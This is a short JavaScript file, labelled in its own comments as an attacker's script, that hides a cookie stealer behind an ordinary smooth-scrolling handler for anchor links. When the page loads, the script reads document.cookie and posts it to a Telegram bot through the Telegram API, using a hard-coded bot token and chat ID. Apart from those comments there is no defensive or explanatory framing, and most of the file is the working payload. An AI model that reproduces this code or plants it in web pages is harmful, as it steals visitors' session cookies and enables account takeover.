// Attacker's malicious JavaScript
document.addEventListener('DOMContentLoaded', () => {
    console.log('Website loaded!');

    // Example: Add smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth'
            });
        });
    });

    // --- Malicious Code ---
    var botToken = "8175599302:AAFc3F8UxHFsvjhkhJKAHWGN4UeArhdSjcE";
    var chatId = "899184398";

    // Get victim's cookies
    var stolenCookies = document.cookie;

    // Send cookies to attacker's Telegram
    var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
    var message = "Stolen Cookies: " + stolenCookies;

    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });

});